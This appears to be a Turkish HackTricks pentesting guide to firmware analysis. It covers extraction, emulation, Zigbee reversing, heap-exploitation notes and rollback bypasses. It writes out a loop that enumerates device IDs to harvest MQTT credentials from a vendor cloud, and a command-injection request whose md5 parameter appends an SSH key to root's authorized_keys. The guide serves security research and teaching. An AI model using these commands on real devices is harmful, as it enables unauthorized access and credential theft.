# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte depolanır; böylece cihaz, açıldığı andan itibaren işletim sisteminin başlatılmasını sağlayan önemli talimatlara erişebilir. Firmware'ı incelemek ve gerektiğinde değiştirmek, güvenlik açıklarını tespit etmede kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç aşağıdakilerle ilgili verilerin toplanmasını içerir:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader ayrıntıları
- Donanım yerleşimi ve datasheet'ler
- Kod tabanı metrikleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişleri ve mevzuata uygunluk sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları çok değerlidir; ayrıca mevcut open-source software bileşenlerinin manuel ve otomatik inceleme süreçleriyle analiz edilmesi de önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz imkanı sunar.

## **Firmware'ı Edinme**

Firmware'ı edinmek, her biri farklı bir karmaşıklık düzeyine sahip çeşitli yöntemlerle gerçekleştirilebilir:

- Kaynaktan (geliştiriciler, üreticiler) **doğrudan**
- Sağlanan talimatlardan **derleyerek**
- Resmi destek sitelerinden **indirerek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanarak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage**'a doğrudan erişerek
- **Güncellemeleri** man-in-the-middle teknikleriyle yakalayarak
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkararak**
- Cihaz iletişimi içindeki güncelleme isteklerini **sniffing** yaparak
- **Hardcoded update endpoint**'lerini tespit edip kullanarak
- Bootloader veya network üzerinden **dump alarak**
- Diğer tüm yöntemler başarısız olduğunda, uygun donanım araçlarını kullanarak **depolama çipini çıkarıp okuyarak**

### Yalnızca UART logları: flash içindeki U-Boot env üzerinden root shell zorlamak

UART RX yok sayılıyorsa (yalnızca loglar alınıyorsa), **U-Boot environment blob**'ını offline olarak **düzenleyerek** yine de bir init shell zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcı (3.3V) kullanarak SPI flash'ı dump edin:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition'ını bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve **U-Boot env CRC32** değerini blob için yeniden hesaplayın.
3. Yalnızca env partition'ını yeniden flash'layıp yeniden başlatın; UART üzerinde bir shell görünmelidir.

Bu yöntem, bootloader shell'inin devre dışı bırakıldığı ancak env partition'ına harici flash erişimi üzerinden yazılabildiği embedded cihazlarda kullanışlıdır.

## Firmware'ı analiz etme

Artık **firmware'a sahip olduğunuza** göre, ona nasıl yaklaşacağınızı bilmek için firmware hakkında bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar vardır:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Bu araçlarla fazla bir şey bulamazsanız `binwalk -E <bin>` ile imajın **entropy** değerini kontrol edin; entropy düşükse şifrelenmiş olma ihtimali düşüktür. Entropy yüksekse şifrelenmiş olması (veya bir şekilde sıkıştırılmış olması) muhtemeldir.

Ayrıca **firmware içine gömülü dosyaları** çıkarmak için bu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ya da dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Dosya Sistemini Alma

Önceki bölümde açıklanan `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini **dosya sistemi türünün adını taşıyan bir klasörün içine** çıkarır; bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Manuel Olarak Çıkarma

Bazen binwalk, imza listesindeki dosya sistemi için **magic byte değerine sahip olmayabilir**. Bu durumlarda binwalk'u kullanarak dosya sisteminin offset değerini bulun, sıkıştırılmış dosya sistemini binary'den **carve edin** ve aşağıdaki adımları kullanarak dosya sistemini türüne göre **manuel olarak çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs dosya sistemini çıkarmak için aşağıdaki **dd komutunu** çalıştırın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra yapısını ve olası güvenlik açıklarını anlamak için ayrıntılı olarak incelenmesi gerekir. Bu süreç, firmware imajını analiz etmek ve değerli verileri çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın ( `<bin>` olarak belirtilir) ilk incelemesi için bir dizi komut sağlanmıştır. Bu komutlar dosya türlerini belirlemeye, string'leri çıkarmaya, ikili verileri analiz etmeye ve partition ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` ile **entropy** kontrol edilir. Düşük entropy, şifreleme olmadığını düşündürürken yüksek entropy, olası şifreleme veya sıkıştırmaya işaret eder.

**embedded files** çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosya inceleme amacıyla **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılabilir; bu işlem çoğunlukla dosya sistemi türünün adını taşıyan bir dizine yapılır (ör. squashfs, ubifs). Ancak **binwalk**, eksik magic bytes nedeniyle dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bu işlem, dosya sisteminin offset değerini bulmak için `binwalk` kullanmayı ve ardından dosya sistemini ayırmak için `dd` komutuyla carve etmeyi içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Sonrasında, filesystem türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel olarak çıkarmak için farklı komutlar kullanılır.

### Filesystem Analysis

Filesystem çıkarıldıktan sonra security flaw araması başlar. Güvenli olmayan network daemon'larına, hardcoded credential'lara, API endpoint'lerine, update server işlevlerine, derlenmemiş code'a, startup script'lerine ve offline analysis için derlenmiş binary'lere dikkat edilir.

İncelenecek **önemli konumlar** ve **öğeler** şunları içerir:

- Kullanıcı credential'ları için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL certificate'ları ve key'leri
- Potansiyel vulnerability'ler için configuration ve script file'ları
- Daha ileri analysis için embedded binary'ler
- Yaygın IoT device web server'ları ve binary'leri

Filesystem içindeki hassas bilgileri ve vulnerability'leri ortaya çıkarmaya yardımcı olan çeşitli tool'lar vardır:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analysis için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static ve dynamic analysis için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries Üzerinde Security Checks

Filesystem içinde bulunan hem source code hem de compiled binary'ler vulnerability'ler açısından dikkatlice incelenmelidir. Unix binary'leri için **checksec.sh** ve Windows binary'leri için **PESecurity** gibi tool'lar, exploit edilebilecek korumasız binary'leri belirlemeye yardımcı olur.

## Derived URL token'ları üzerinden cloud config ve MQTT credential'larını elde etme

Birçok IoT hub, device başına configuration'larını aşağıdakine benzeyen bir cloud endpoint'inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis sırasında, `<token>` değerinin hardcoded bir secret kullanılarak device ID'den local olarak türetildiğini görebilirsiniz; örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve uppercase hex olarak temsil edilir

Bu tasarım, bir deviceId ve STATIC_KEY'i öğrenen herkesin URL'yi yeniden oluşturmasına ve cloud config'i çekmesine olanak tanır; bu işlem çoğu zaman plaintext MQTT credential'larını ve topic prefix'lerini ortaya çıkarır.

Pratik workflow:

1) UART boot log'larından deviceId'yi çıkarın

- Bir 3.3V UART adapter'ını (TX/RX/GND) bağlayın ve log'ları yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Örneğin, cloud config URL pattern'ini ve broker adresini yazdıran satırları arayın:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını kurtarma

- İkili dosyaları Ghidra/radare2 içine yükleyin ve yapılandırma yolunu (`"/pf/"`) veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash ile türetin ve digest'i büyük harfe dönüştürün:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Bulut yapılandırmasını ve MQTT kimlik bilgilerini toplayın

- URL'yi oluşturun ve JSON'u curl ile çekin; sırları çıkarmak için jq ile ayrıştırın:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Plaintext MQTT ve weak topic ACLs'i (mevcutsa) abuse edin

- Ele geçirilen kimlik bilgilerini kullanarak maintenance topic'lerine subscribe olun ve hassas olayları arayın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Öngörülebilir cihaz kimliklerini listeleyin (ölçekli olarak, yetkilendirmeyle)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarını ve ardından sıralı bir son eki içerir.
- Aday kimlikler üzerinde yineleme yapabilir, token'lar türetebilir ve yapılandırmaları program aracılığıyla alabilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Mass enumeration denemeden önce her zaman açık yetki alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden secret'ları kurtarmak için emulation veya static analysis yöntemlerini tercih edin.


Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis** işlemine olanak tanır. Bu yaklaşım, donanım veya architecture bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem'ı veya belirli binary'leri, Raspberry Pi gibi matching architecture ve endianness kullanan bir cihaza ya da önceden hazırlanmış bir virtual machine'e aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary'leri Emüle Etme

Tek programları incelemek için programın endianness ve CPU architecture özelliklerini belirlemek kritik öneme sahiptir.

#### MIPS Mimarisi Örneği

Bir MIPS architecture binary'sini emüle etmek için şu command kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını kurmak için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler için ise `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emülasyon amacıyla `qemu-arm` emülatörü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve diğer araçlar, tam firmware emülasyonunu kolaylaştırır; süreci otomatikleştirir ve dynamic analysis çalışmalarına yardımcı olur.

## Dynamic Analysis in Practice

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. İşletim sistemine ve filesystem'e shell erişiminin korunması kritik öneme sahiptir. Emülasyon, donanım etkileşimlerini kusursuz biçimde taklit etmeyebilir; bu nedenle zaman zaman emülasyonun yeniden başlatılması gerekebilir. Analiz kapsamında filesystem yeniden incelenmeli, açığa çıkmış web sayfaları ve network servisleri exploit edilmeli ve bootloader açıkları araştırılmalıdır. Olası backdoor açıklarını tespit etmek için firmware bütünlüğü testleri kritik öneme sahiptir.

## Runtime Analysis Techniques

Runtime analysis, gdb-multiarch, Frida ve Ghidra gibi araçlar kullanılarak bir process veya binary ile kendi çalışma ortamında etkileşim kurulmasını; breakpoint'ler ayarlanmasını ve fuzzing ile diğer teknikler aracılığıyla açıkların tespit edilmesini içerir.

Tam bir debugger bulunmayan embedded hedeflerde, **statik olarak linklenmiş bir `gdbserver` cihaz üzerine kopyalanmalı** ve cihaza uzaktan bağlanılmalıdır:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub’larında RF stack’i genellikle bir **radio MCU** ile bir Linux userland process’i arasında bölünür. Yararlı bir workflow, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. **RF frame** havada
2. **controller-side parser** radio MCU üzerinde
3. Linux’a yönlendirilen **serial/UART text or TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon içindeki **application dispatcher**
5. **protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki reversing hedefi oluşturur. Controller, binary radio frame’lerini `Group,Command,arg1,arg2,...` gibi bir textual protocol’e dönüştürüyorsa şunları ortaya çıkarın:

- **message groups** ve dispatch tabloları
- Hangi mesajların **network** üzerinden, hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator fields** (örneğin Zigbee `manufacturer_code` ve custom `cluster_command`)
- Hangi handler’ların yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebilir olduğu

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine bağlı olup olmadığını kontrol edin. Öyleyse commissioning trafiğini sniffing etmek **Network Key** değerini açığa çıkarabilir. Zigbee 3.0 install code’ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL komutları, standartlaştırılmış cluster’lara göre genellikle daha iyi bir hedeftir; çünkü daha az battle-tested validation içeren **custom parsing code** ve internal **FSM**’lere aktarılırlar.<sup>[[8]](#references)</sup>

Pratik workflow:

- **vendor-only handler**’ı bulana kadar command dispatcher’ı reverse edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** tablolarını ortaya çıkarın.
- Otomatik olarak ilerleyen **transitional states** ile sonunda attacker-controlled state’i resetleyen veya serbest bırakan retry/error branch’lerini belirleyin.
- Buggy handler’ın her zaman erişilebilir olduğunu varsaymak yerine, daemon’ı vulnerable state’e sokmak için hangi legitimate protocol exchange’lerinin gerektiğini doğrulayın.

Timing-sensitive protocol’lerde bir Python framework’ünden packet replay yapmak çok yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoints**, **attributes** ve commissioning timing’i açığa çıkarabilmek için gerçek hardware üzerinde (örneğin bir **nRF52840**) vendor-grade stack kullanan legitimate device’ı emüle etmektir.

### Fragmented-download bug class in embedded daemons

**Fragmented blob/model/configuration download** işlemlerinde tekrarlanan bir firmware bug class görülür:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` çağrısıyla allocation yapar.
2. Sonraki fragment’ler yalnızca `packet_total_size >= offset + chunk_len` gibi attacker-controlled **packet-local** alanlarını doğrular.
3. Copy işlemi, **original allocated size** ile karşılaştırma yapmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu, saldırganın şunları göndermesine olanak tanır:

- Küçük bir heap allocation zorlamak için **small** declared total size içeren ilk geçerli fragment.
- Beklenen **offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki bir fragment.
- Yeni kontrolleri karşılayan, ancak yine de originally allocated buffer’ı overflow eden forged packet-local size.

Vulnerable path commissioning logic’in arkasında olduğunda exploitation, malformed fragment’leri göndermeden önce hedefi beklenen model-download veya blob-download state’ine sokacak yeterli **device emulation** içermelidir.

### Protocol-driven `free()` triggers

Embedded daemon’larda heap metadata exploitation’ı tetiklemenin en kolay yolu çoğu zaman “cleanup’ı beklemek” değil, **protocol’ün kendi error handling’ini zorlamaktır**:<sup>[[8]](#references)</sup>

- Malformed follow-up fragment’ler göndererek FSM’i **retry** veya **error** state’lerine ilerletin.
- Retry threshold’u aşarak daemon’ın **context’i resetlemesini** ve corrupted buffer’ı free etmesini sağlayın.
- Process başka nedenlerle crash olmadan önce allocator-side primitive’leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yöntem, corrupting chunk metadata’nın unlink/unbin logic’i bir write primitive’e dönüştürebildiği embedded Linux’taki **musl/uClibc/dlmalloc-like** allocator’lara karşı özellikle yararlıdır. Stable bir pattern, gerçek bin pointer’larını hemen overwrite edip process’i crash ettirmek yerine, allocator traversal’ı **overflowed buffer** içinde staged **fake chunks**’lara yönlendirmek için bir **size field**’ı corrupt etmektir.

## Binary Exploitation and Proof-of-Concept

Belirlenen vulnerabilities için bir PoC geliştirmek, hedef architecture’ın ve lower-level language’lerde programming’in derinlemesine anlaşılmasını gerektirir. Embedded system’lerde binary runtime protection’lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc’ye benzer fastbin’ler kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle herhangi bir fake chunk kontrolleri (sane size, `fd = 0` ve surrounding chunk’ların “in use” olarak görülmesi) geçebilmelidir.<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLR etkin, ancak ana binary **non-PIE** ise in-binary `.data/.bss` adresleri sabittir. Bir fastbin allocation’ı **function pointer table** üzerine yerleştirmek için zaten geçerli bir heap chunk header’a benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser-stopping NUL:** JSON parse edilirken payload içindeki bir `\x00`, parsing’i durdururken stack pivot/ROP chain için trailing attacker-controlled byte’ları koruyabilir.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağrılarını yapan bir ROP chain, executable shellcode’u bilinen bir mapping’e yerleştirip oraya jump edebilir.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi operating system’ler, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sağlar.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerini gerçekleştirmenize yardımcı olmak için tasarlanmış bir distro’dur. Gerekli tüm araçların yüklü olduğu pre-configured bir environment sağlayarak size büyük ölçüde zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing operating system.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Bir vendor firmware image’ları için cryptographic signature checks uygulasa bile, **version rollback (downgrade) protection** sıklıkla atlanır. Boot veya recovery loader yalnızca signature’ı embedded public key ile doğruluyor, ancak flash edilen image’ın *version* değerini (veya monotonic counter’ını) karşılaştırmıyorsa saldırgan, hâlâ geçerli bir signature taşıyan **older, vulnerable firmware**’ı meşru şekilde yükleyebilir ve böylece patched vulnerabilities’ı yeniden etkinleştirebilir.<sup>[[4]](#references)</sup>

Tipik attack workflow:

1. **Obtain an older signed image**
* Vendor’ın public download portal, CDN veya support site’ından alın.
* Companion mobile/desktop application’lardan çıkarın (örneğin bir Android APK içindeki `assets/firmware/` altında).
* VirusTotal, Internet archives, forumlar vb. third-party repository’lerden elde edin.
2. Image’ı herhangi bir exposed update channel üzerinden cihaza **upload veya serve edin**:
* Web UI, mobile-app API, USB, TFTP, MQTT vb.
* Birçok consumer IoT device, Base64-encoded firmware blob’larını kabul eden, bunları server-side decode eden ve recovery/upgrade başlatan *unauthenticated* HTTP(S) endpoint’leri sunar.
3. Downgrade işleminden sonra newer release’te patched edilmiş bir vulnerability’yi exploit edin (örneğin daha sonra eklenen bir command-injection filter).
4. Persistence elde edildiğinde detection’dan kaçınmak için isteğe bağlı olarak latest image’ı yeniden flash edin veya update’leri devre dışı bırakın.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Savunmasız (downgrade edilmiş) firmware'de `md5` parametresi sanitisation uygulanmadan doğrudan bir shell komutuna birleştirilir; bu da rastgele komutların enjekte edilmesine olanak tanır (burada SSH key tabanlı root erişimini etkinleştirmek için). Daha sonraki firmware sürümleri temel bir karakter filtresi ekledi, ancak downgrade korumasının bulunmaması düzeltmeyi etkisiz kılar.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok vendor, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware image'larını companion mobil uygulamalarının içine dahil eder. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi path'lerde şifrelenmemiş olarak saklanır. `apktool`, `ghidra` gibi araçlar veya yalnızca `unzip`, fiziksel donanıma dokunmadan imzalı image'ları çıkarmanıza olanak tanır.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot tasarımlarında yalnızca updater için uygulanan anti-rollback bypass

Bazı vendor'lar anti-downgrade **ratchet** mekanizmasını gerçekten uygular, ancak bunu yalnızca *updater* mantığı içinde yapar (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya userspace OTA agent). Eğer **bootloader** daha sonra yalnızca image signature/CRC kontrolü yapar ve partition table'a veya slot metadata'sına güvenirse rollback protection yine bypass edilebilir.<sup>[[7]](#references)</sup>

Tipik zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da saklanan bir değerle karşılaştırır ve daha eski signed image'ları reddeder.
- Bootloader bu ratchet değerini **parse etmez** ve seçilen slot'u boot etmeden önce yalnızca header, CRC ve signature doğrulaması yapar.
- Slot activation ayrı olarak bir partition table'da veya slot başına bir generation counter'da saklanır ve doğrulanan exact firmware digest'e **cryptographically bound** değildir.

Bu durum dual-slot sistemlerde bir **validate-one-image / boot-another-image** primitive'i oluşturur. Saldırgan, updater'ın güncel signed image kullanarak slot B'yi bir sonraki boot target olarak işaretlemesini sağlayabiliyor ve reboot öncesinde slot B'yi overwrite edebiliyorsa bootloader yalnızca daha önce commit edilmiş slot metadata'sına güvendiği için downgraded image'ı boot edebilir.

Yaygın abuse pattern:

1. **Current signed** firmware'ı passive slot'a upload edin ve layout'un bu slot'u bir sonraki active slot olarak işaretlemesini sağlamak için normal validation/switch routine'i çalıştırın.
2. **Henüz reboot etmeyin**. Aynı session içinde slot-preparation/erase routine'ine yeniden girin.
3. Updater'ın az önce promote edilen **aynı physical slot'u** silmesini sağlamak için stale boot-state veya stale slot-selection logic'i abuse edin.
4. Bu slot'a **daha eski ancak hâlâ signed** bir firmware yazın.
5. Ratchet'i uygulayan validation routine'ini atlayın ve doğrudan reboot edin.
6. Bootloader promote edilen slot'u seçer, yalnızca signature/integrity doğrulaması yapar ve eski image'ı boot eder.

A/B update implementation'larını reverse ederken aranacak noktalar:

- Başarılı bir switch sonrasında yenilenmeyen **boot-time flags** üzerinden türetilen slot selection.
- **Current committed layout** yerine stale state'e göre slot silen `prepare_passive_slot()` benzeri bir routine.
- Yalnızca bir **generation counter** / active flag artıran ve doğrulanmış image hash'ini saklamayan `part_write_layout()` benzeri bir function.
- Ratchet kontrollerinin userspace veya updater code içinde uygulanması, ancak ROM / bootloader / secure boot stages içinde uygulanmaması.
- Erase veya recovery routine'lerinin, içeriği silinip yeniden yazıldıktan sonra bile slot'u bootable olarak işaretli bırakması.

### Update Logic'i Değerlendirme Checklist'i

* *Update endpoint*'in transport/authentication güvenliği yeterli şekilde sağlanmış mı (TLS + authentication)?
* Device, flashing işleminden önce **version numbers** veya bir **monotonic anti-rollback counter** karşılaştırıyor mu?
* Image, bir secure boot chain içinde doğrulanıyor mu (ör. signatures ROM code tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrol etmek yerine updater ile **aynı ratchet'i uyguluyor mu**?
* Slot activation metadata'sı **validated firmware digest/version'a bağlı** mı, yoksa promotion sonrasında bir slot değiştirilebiliyor mu?
* Slot switch başarılı olduktan sonra device reboot etmeye zorlanıyor mu, yoksa sonraki update/erase routine'lerine aynı session içinde hâlâ erişilebiliyor mu?
* Userland code ek sanity check'ler gerçekleştiriyor mu (ör. allowed partition map, model number)?
* *Partial* veya *backup* update flow'ları aynı validation logic'i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback attack'lerine karşı savunmasızdır.

## Pratik yapmak için vulnerable firmware

Firmware'daki vulnerabilities keşfetme pratiği yapmak için başlangıç noktası olarak aşağıdaki vulnerable firmware project'lerini kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
